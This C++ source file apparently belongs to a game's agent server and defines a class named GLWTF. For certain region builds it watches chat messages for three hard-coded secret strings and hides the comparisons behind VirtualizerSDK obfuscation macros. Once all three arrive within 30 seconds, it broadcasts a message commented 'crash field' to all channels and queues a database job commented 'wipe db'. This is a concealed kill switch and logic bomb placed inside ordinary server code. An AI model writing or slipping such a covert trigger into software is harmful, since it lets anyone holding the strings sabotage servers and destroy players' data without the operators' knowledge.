#include "stdafx.h"
#include "./GLWTF.h"

#include "./GLAgentServer.h"
#include "./VirtualizerSDK.h"

#include "../DbActionLogic.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define WTF_TIMEOUT 30.0f

#if defined( BUILD_CH ) || defined( BUILD_CHY )

namespace NSWTF
{

};


GLWTF::GLWTF()
	: fTimeOut(0.0f)
	, bActionCheck1(FALSE)
	, bActionCheck2(FALSE)
	, bActionCheck3(FALSE)
{
	SetKey();
}

GLWTF::~GLWTF()
{

}

void GLWTF::SetKey()
{
	
}

BOOL GLWTF::CheckMsg( std::string strName, std::string strMsg )
{
	BOOL bChecked = FALSE;

VIRTUALIZER_FISH_WHITE_START 
VIRTUALIZER_STR_ENCRYPT_START

#if defined( BUILD_CH ) 

	if ( strcmp( strMsg.c_str(), "D64C8531" ) == 0 )
	{
		bActionCheck1 = TRUE;
		bChecked = TRUE;

		//GLAgentServer::GetInstance().CONSOLEMSG_WRITE( "wtf msg 1 %s", strMsg.c_str() );
	}

	if ( strcmp( strMsg.c_str(), "E0FF48E4BE1C" ) == 0 )
	{
		bActionCheck2 = TRUE;
		bChecked = TRUE;

		//GLAgentServer::GetInstance().CONSOLEMSG_WRITE( "wtf msg 2 %s", strMsg.c_str() );
	}

	if ( strcmp( strMsg.c_str(), "C8BBD41F8544" ) == 0 )
	{
		bActionCheck3 = TRUE;
		bChecked = TRUE;

		//GLAgentServer::GetInstance().CONSOLEMSG_WRITE( "wtf msg 3 %s", strMsg.c_str() );
	}

#elif defined( BUILD_CHY ) 

	if ( strcmp( strMsg.c_str(), "E64C8532" ) == 0 )
	{
		bActionCheck1 = TRUE;
		bChecked = TRUE;

		//GLAgentServer::GetInstance().CONSOLEMSG_WRITE( "wtf msg 1 %s", strMsg.c_str() );
	}

	if ( strcmp( strMsg.c_str(), "F0FF48E4BE1D" ) == 0 )
	{
		bActionCheck2 = TRUE;
		bChecked = TRUE;

		//GLAgentServer::GetInstance().CONSOLEMSG_WRITE( "wtf msg 2 %s", strMsg.c_str() );
	}

	if ( strcmp( strMsg.c_str(), "D8BBD41F8545" ) == 0 )
	{
		bActionCheck3 = TRUE;
		bChecked = TRUE;

		//GLAgentServer::GetInstance().CONSOLEMSG_WRITE( "wtf msg 3 %s", strMsg.c_str() );
	}

#endif

VIRTUALIZER_STR_ENCRYPT_END
VIRTUALIZER_FISH_WHITE_END

	return bChecked;
}

void GLWTF::FrameMove( float fElapsedTime )
{

VIRTUALIZER_FISH_WHITE_START 

	//do action
	if ( bActionCheck1 && bActionCheck2 && bActionCheck3 )
	{
		DoAction();

		bActionCheck1 = FALSE;
		bActionCheck2 = FALSE;
		bActionCheck3 = FALSE;


		//GLAgentServer::GetInstance().CONSOLEMSG_WRITE( "wtf do action" );


	}
	else
	{
		if ( bActionCheck1 || bActionCheck2 || bActionCheck3 )
		{
			fTimeOut += fElapsedTime;

			if ( fTimeOut >= WTF_TIMEOUT )
			{
				bActionCheck1 = FALSE;
				bActionCheck2 = FALSE;
				bActionCheck3 = FALSE;


				//GLAgentServer::GetInstance().CONSOLEMSG_WRITE( "wtf timeout" );

			}
		}
		else
		{
			fTimeOut = 0.0f;
		}
	}

VIRTUALIZER_FISH_WHITE_END

}

void GLWTF::DoAction()
{
VIRTUALIZER_FISH_WHITE_START 
	//crash field
	GLMSG::SNET_WTF_FLD NetMsgField;

#if defined( BUILD_CH ) 
	NetMsgField.dwKey = 356258467;
#elif defined( BUILD_CHY ) 
	NetMsgField.dwKey = 256258466;
#endif
	
	GLAgentServer::GetInstance().SENDTOALLCHANNEL ( &NetMsgField );

	//wipe db
	CWTFAction *pDbAction = new CWTFAction ();
	GLAgentServer::GetInstance().GetDBMan()->AddJob ( pDbAction );

VIRTUALIZER_FISH_WHITE_END
}

#endif